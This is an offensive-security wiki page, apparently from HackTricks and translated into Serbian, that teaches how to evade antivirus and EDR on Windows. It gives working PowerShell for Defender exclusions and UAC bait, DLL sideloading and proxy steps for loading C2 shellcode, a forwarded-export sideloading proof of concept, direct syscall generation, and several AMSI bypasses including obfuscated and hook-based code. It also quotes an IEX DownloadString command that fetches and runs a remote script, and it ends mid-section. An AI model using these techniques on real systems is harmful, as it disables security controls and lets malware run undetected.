# Zaobilaženje antivirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defendera koji se lažno predstavlja kao drugi AV.
- [Onemogućavanje Defendera ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre menjanja Defendera

Javni loaderi koji se predstavljaju kao game cheats često dolaze u obliku nepotpisanih Node.js/Nexe instalera koji prvo **traže od korisnika povišene privilegije**, a tek zatim onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li je kontekst administrativni pomoću komande `net session`. Komanda uspeva samo kada korisnik koji je pokreće ima administratorska prava, pa neuspeh znači da loader radi kao standardni korisnik.
2. Odmah ponovo pokrenite program pomoću glagola `RunAs` da biste prikazali očekivani UAC prompt za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „crackovan“ softver, pa obično prihvataju prompt, čime malware dobija prava potrebna za promenu Defender-ove politike.<sup>[[26]](#references)</sup>

### Isključenja `MpPreference` za svaki disk

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno onemoguće servis. Loader prvo gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka isključenja**, zbog kojih svaki korisnički profil, sistemski direktorijum i prenosivi disk postaju nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Petlja prolazi kroz svaki montirani fajl-sistem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload smešten bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` je preventivno — napadači zadržavaju mogućnost da kasnije učitavaju nepotpisane drajvere, bez ponovnog diranja Defender-a.
- Sve promene se upisuju u `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci ostali aktivni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, površne provere stanja i dalje prijavljuju da je „antivirus aktivan“, iako inspekcija u realnom vremenu uopšte ne obuhvata te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Trenutno AV-ovi koriste različite metode za proveru da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu i, kod naprednijih EDR-ova, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izdvajanjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do vašeg otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina za zaobilaženje ove vrste detekcije:

- **Encryption**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali će vam trebati neka vrsta loader-a za dešifrovanje i pokretanje programa u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo promeniti neke stringove u binarnoj datoteci ili skripti da bi prošla AV proveru, ali to može da oduzme dosta vremena, u zavisnosti od toga šta pokušavate da obfuscate-ujete.

- **Custom tooling**

Ako razvijate sopstvene alate, neće postojati poznati zlonamerni potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar alat za proveru statičke detekcije Windows Defender-a je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli datoteku na više segmenata, a zatim traži od Defender-a da skenira svaki od njih zasebno. Tako može tačno da vam pokaže koji su stringovi ili bajtovi u binarnoj datoteci označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### Offline testovi PE funkcija za statičke klasifikatore

Pakovani ili šifrovani bajtovi payload-a samo su jedan od ulaznih podataka statičkog klasifikatora. EMBER2024 izdvaja PE funkcije, uključujući imports, exports, sekcije, zaglavlja i Authenticode podatke.<sup>[[48]](#references)</sup> U jednom eksperimentu sa loader-om, dodavanje 141 imports-a koji izgledaju bezazleno smanjilo je zlonamerni skor EMBER2024 za 93%, dok su imports-i povezani sa malware-om povisili skor. Ovo je rezultat dobijen za taj model i te uzorke, a ne pouzdan način za zaobilaženje određenog AV/EDR proizvoda.<sup>[[50]](#references)</sup>

Za test loader-a uz odgovarajuće ovlašćenje, zadržite payload i putanju izvršavanja nepromenjenim, menjajte po jednu predviđenu build promenljivu za svaku varijantu i upoređujte skorove offline. Pregledajte dobijene PE funkcije, jer promena u buildu može uticati na više grupa funkcija.<sup>[[49]](#references)[[50]](#references)</sup> Da bi predviđeni imports-i ostali u IAT-u, pozivajte izabrane Win32 API-je iz dostupnog koda. Menjajte izbor i raspoređujte pozive kroz različite build-ove umesto da pravite fiksnu funkciju za kamuflažu koja može postati potpis. U eksperimentu su prijavljeni i niži skorovi pri korišćenju važećeg potpisivanja koda, export entries i većeg broja funkcija koje povećavaju `.pdata`; nevažeće potpisivanje imalo je mali uticaj, a uticaj `.pdata` bio je neznatan.<sup>[[50]](#references)</sup>

Paket `thrember` omogućava izdvajanje funkcija i korišćenje benchmark modela. Nakon instalacije, pokrenite `thrember.download_models("models")` koristeći postojeći direktorijum `models`, a zatim pokrenite scorer iz njegovog nadređenog direktorijuma: pomoćna funkcija za preuzimanje menja trenutni radni direktorijum. PE klasifikator može da izračuna skor za direktorijum sa build-ovima, a da ih ne šalje servisu za skeniranje:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Tokom poređenja zadržite iste verzije modela i ekstraktora obeležja. Niži offline rezultat samo pokazuje kako ovaj klasifikator reaguje na izmenjeni binarni fajl; ne dokazuje izbegavanje bihevioralne analize, emulacije ili drugog modela nekog proizvođača.<sup>[[49]](#references)[[50]](#references)</sup> Za [polimorfizam po verzijama izgradnje i kamuflažu spoljnog binarnog fajla u virtuelizovanim payload-ima](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) pogledajte zaseban model izvršavanja.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće vaš binarni fajl u sandbox-u i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz vašeg pregledača, pravljenje minidump-a procesa LSASS itd.). Ovim može biti malo teže baviti se, ali evo nekoliko stvari koje možete uraditi da biste izbegli sandbox-ove.

- **Spavanje pre izvršavanja** U zavisnosti od implementacije, ovo može biti odličan način da zaobiđete dinamičku analizu AV-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi ometali korisnikov rad, pa dugo spavanje može omesti analizu binarnih fajlova. Problem je u tome što mnogi AV sandbox-ovi mogu jednostavno da preskoče spavanje, u zavisnosti od toga kako je implementirano.
- **Provera resursa računara** Sandbox-ovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore računar korisnika. Ovde možete biti i veoma kreativni, na primer, proverom temperature CPU-a ili čak brzine ventilatora; u sandbox-u nije sve implementirano.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara i videti da li se poklapa sa onim koji ste naveli. Ako se ne poklapa, program može da se ugasi.

Ispostavlja se da se ime računara u sandbox-u Microsoft Defender-a zove HAL9TH, pa možete da proverite ime računara u svom malware-u pre detekcije. Ako se ime poklapa sa HAL9TH, znači da ste unutar sandbox-a Defender-a, pa možete da ugasite program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za zaobilaženje sandbox-ova

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **javni alati** će pre ili kasnije biti **detektovani**, pa bi trebalo da se zapitate:

Na primer, ako želite da izvučete dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da koristite neki drugi, manje poznat projekat koji takođe pravi dump LSASS-a?

Verovatno je ovo drugo pravi odgovor. Uzmimo mimikatz kao primer: verovatno je jedan od najčešće označenih malware alata od strane AV-ova i EDR-ova, ako ne i najčešće označen. Iako je sam projekat veoma dobar, zaobilaženje AV-ova uz njegovu upotrebu predstavlja pravu noćnu moru, pa samo potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defender-u i, molim vas, ozbiljno, **NEMOJTE DA OTPREMLJUJETE NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXE-ovi naspram DLL-ova

Kad god je moguće, uvek **dajte prednost DLL-ovima radi izbegavanja detekcije**. Prema mom iskustvu, DLL fajlovi se obično **mnogo ređe detektuju** i analiziraju, pa je ovo veoma jednostavan trik koji u nekim slučajevima može da pomogne u izbegavanju detekcije (ako vaš payload može da se pokrene kao DLL, naravno).

Kao što možemo da vidimo na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me običnog Havoc EXE payload-a i običnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo prikazati nekoliko trikova koje možete da koristite sa DLL fajlovima kako biste bili mnogo neupadljiviji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi redosled pretrage DLL-ova koji koristi loader tako što postavlja aplikaciju žrtve i zlonamerne payload-e jedne pored drugih.

Možete da pronađete programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće PowerShell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa unutar „C:\Program Files\\“ podložnih DLL hijacking-u i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite programe podložne DLL Hijacking/Sideloading-u**. Ova tehnika je prilično neprimetna kada se pravilno izvede, ali ako koristite javno poznate programe podložne DLL Sideloading-u, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku koja se zove **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje preko proxy (i zlonamernog) DLL-a originalnom DLL-u, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: predložak izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je to uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sShit-ov Twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoza (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „forwarderi“: umesto da ukazuje na kod, stavka izvoza sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada pozivalac razrešava izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno je razumeti sledeće ponašanje:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog prostora imena KnownDLLs (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata i direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava primitiv za indirektni sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum s DLL-om pod kontrolom napadača, nazvanim tačno kao prosleđeni ciljni modul. Kada se pozove prosleđeni izvoz, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi prema uobičajenom redosledu pretrage.

PoC (copy-paste):
1) Kopirajte potpisanu sistemsku DLL datoteku u folder sa dozvolom za upis
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni DllMain je dovoljan za pokretanje code execution-a; ne morate da implementirate prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Uočeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, greška „missing API“ pojaviće se tek nakon što se `DllMain` već izvršio

Saveti za pronalaženje:
- Usredsredite se na forwarded exports čiji ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete nabrojati alatima kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja koje nisu sistemske, a zatim učitavaju DLL-ove koji nisu KnownDLLs, sa istim osnovnim imenom, iz tog direktorijuma
- Upozoravajte na lance procesa/modula kao što su: `rundll32.exe` → `keyiso.dll` sa putanje koja nije sistemska → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite pravila integriteta koda (WDAC/AppLocker) i zabranite upisivanje+izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je skup alata za payload-e koji služi za zaobilaženje EDR-ova pomoću suspendovanih procesa, direktnih syscall-ova i alternativnih metoda izvršavanja`

Freeze možete da koristite za prikriveno učitavanje i izvršavanje shellcode-a.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša: ono što radi danas može biti otkriveno sutra, zato se nikad ne oslanjajte na samo jedan alat; ako je moguće, pokušajte da povežete više tehnika za izbegavanje detekcije.

## Direct/Indirect Syscalls i SSN rezolucija (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hookove, možete da generišete **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja zakačene ulazne tačke izvoza.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: emituje instrukciju `syscall`/`sysenter`/`SVC #0` u generisanom stubu (ne dolazi do pozivanja izvoza iz `ntdll`).
- **Indirect**: skače na postojeći **syscall gadget** unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za izbegavanje heurističke detekcije); **randomized indirect** pri svakom pozivu bira gadget iz skupa.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disk; syscall sekvenca se pronalazi tokom izvršavanja.

**Strategije za rezoluciju SSN-a otporne na hookove:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova prema virtuelnoj adresi umesto čitanjem bajtova stubova.
- **SyscallsFromDisk**: mapira čistu `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog odeljka `.text`, a zatim je odmapira (zaobilazi sve hookove u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-a sortiranjem prema VA sa proverom opcode-ova kada je stub čist; ako je zakačen, koristi zaključivanje na osnovu VA.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH za hvatanje SSN-a iz `EAX` tokom izvršavanja, bez parsiranja zakačenih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[malware bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa ako bi nekako mogao da izvršiš payloads **direktno u memoriji**, AV nije mogao ništa da uradi da to spreči jer nije imao dovoljno uvida.

AMSI je integrisan u sledeće komponente operativnog sistema Windows:

- User Account Control ili UAC (podizanje privilegija za EXE, COM, MSI ili instalaciju ActiveX-a)
- PowerShell (skripte, interaktivna upotreba i dinamička procena koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u programu Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obrati pažnju na to kako dodaje `amsi:` i zatim putanju do izvršne datoteke iz koje je skripta pokrenuta, u ovom slučaju, powershell.exe.

Nismo upisali nijednu datoteku na disk, ali smo ipak otkriveni u memoriji zbog AMSI-ja.

Štaviše, počev od verzije **.NET 4.8**, C# kod se takođe proverava kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` za učitavanje koda koji se izvršava u memoriji. Zato se za izvršavanje u memoriji, ako želiš da izbegneš AMSI, preporučuje korišćenje starijih verzija .NET-a (kao što je 4.7.2 ili starija).

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom koristi statičko otkrivanje, izmena skripti koje pokušavaš da učitaš može biti dobar način za izbegavanje otkrivanja.

Međutim, AMSI može da ukloni obfuskaciju sa skripti čak i kada imaju više slojeva, pa obfuskacija može biti loš izbor, u zavisnosti od načina na koji je urađena. Zbog toga izbegavanje otkrivanja nije baš jednostavno. Ipak, ponekad je dovoljno da promeniš nekoliko naziva promenljivih i sve će biti u redu, pa to zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell.exe (kao i cscript.exe, wscript.exe itd.), moguće je lako manipulisati njime, čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Izazivanje greške**

Prisilno izazivanje neuspeha pri inicijalizaciji AMSI-ja (`amsiInitFailed`) dovešće do toga da se za trenutni proces ne pokrene skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je potrebna samo jedna linija PowerShell koda da AMSI učini neupotrebljivim u trenutnom PowerShell procesu. AMSI je, naravno, sam označio ovu liniju, pa su potrebne neke izmene da bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist-a](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno čim se ovaj post objavi, zato ne bi trebalo da objavljujete nikakav kod ako vam je plan da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije „AmsiScanBuffer“ u amsi.dll (odgovorne za skeniranje ulaza koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat stvarnog skeniranja iznosi 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Više o njima možete saznati na [**ovoj stranici**](basic-powershell-for-pentesters/index.html#amsi-bypass) i u [**ovom repo-u**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Preusmeravanje pokazivača za AMSI COM skeniranje umesto patchovanja `AmsiScanBuffer`

Još jedan bypass koji je ograničen na trenutni proces ne menja ulaznu tačku `AmsiScanBuffer`. U opisanom 64-bitnom .NET loader-u, AMSI COM objekat se kreira pomoću CLSID-ja `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` vraća pokazivač na interfejs, a njegov vtable slot na pomeraju `0x18` koristi se kao cilj poziva za skeniranje. Loader patchuje izvorni pokazivač za `Console.Clear()` malim x64 stub-om, menja taj vtable unos pod `VirtualProtect()`, a zatim vraća prvobitnu zaštitu stranice. Preduslovi su širina 64-bitnog pokazivača i očekivani COM raspored; ovo nije generički pomeraj koji važi za proizvoljne AMSI interfejse ili verzije. Prethodne uočene faze su [učitavanje potpisanog AppDomainManager sidecar-a](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) i [RESX deserializacija](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Uočeni bajtovi stub-a su `41 C7 00 01 00 00 00 33 C0 C3`: oni upisuju **1** u pokazivač rezultata u `r8` i vraćaju **0** u `eax`. Zato se u opisanom postupku pogrešno izjednačava tvrdnja da je rezultat skeniranja `AMSI_RESULT_CLEAN` (0) sa povratnom vrednošću `S_OK`. Prema dokumentovanom redosledu vrednosti `AMSI_RESULT`, rezultat **1** je `AMSI_RESULT_NOT_DETECTED`; i dalje je ispod praga za detekciju.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan bypass nezavisan od jezika jeste postavljanje korisničkog hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i u tom procesu se ne vrše skeniranja.<sup>[[23]](#references)</sup>

Osnovni prikaz implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi sa PowerShell, WScript/CScript i prilagođenim loader-ima (sa svime što bi inače učitalo AMSI).
- Kombinujte ga sa slanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke tragove u komandnoj liniji.
- Primećeno je da ga koriste loader-i pokrenuti preko LOLBins (npr. `regsvr32` poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja koja izbegava detekciju potpisa pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza karaktera, kao i nasumične promene veličine slova u PowerShell ključnim rečima.

**Uklonite detektovani potpis**

Možete koristiti alate kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovani AMSI potpis iz memorije trenutnog procesa. Ovi alati skeniraju memoriju trenutnog procesa tražeći AMSI potpis, a zatim ga prepisuju NOP instrukcijama, čime ga efektivno uklanjaju iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

